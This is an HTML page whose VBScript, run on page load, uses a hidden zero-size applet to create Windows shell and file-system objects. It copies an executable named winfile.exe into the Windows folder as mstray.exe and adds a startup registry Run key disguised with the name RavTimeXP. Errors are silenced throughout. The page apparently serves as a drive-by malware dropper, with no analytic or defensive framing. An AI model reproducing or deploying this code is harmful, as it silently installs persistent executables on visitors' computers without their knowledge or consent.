   <body><html>
   <body >
   <script language=vbscript>
   document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><APPLET NAME=LHW HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET></div>"
   </script>
   <script language=vbscript>
   On Error Resume Next
   Dim we,path,win
   we = ""
   Path = ""
   win=""
   Path = Left(document.location, Len(document.location) - 11)
   Path = Mid(Path, 9)
   Set AppleObject = document.applets("lhw")
   AppleObject.setCLSID ("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")
   AppleObject.createInstance()
   Set WsShell = AppleObject.GetObject()
   AppleObject.setCLSID ("{0D43FE01-F093-11CF-8940-00A0C9054228}")
   AppleObject.createInstance()
   Set fsoo = AppleObject.GetObject()
   win=fsoo.getspecialfolder(0)
   we = WsShell.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\RavTimeXP")
   If we <> ""  Then
   we = we
   Else
   WsShell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\RavTimeXP", win+"\mstray.exe"
   End If
   fsoo.copyfile path+"winfile.exe", win+"\mstray.exe"
   </script>
   </body>
   </html>
   </body>
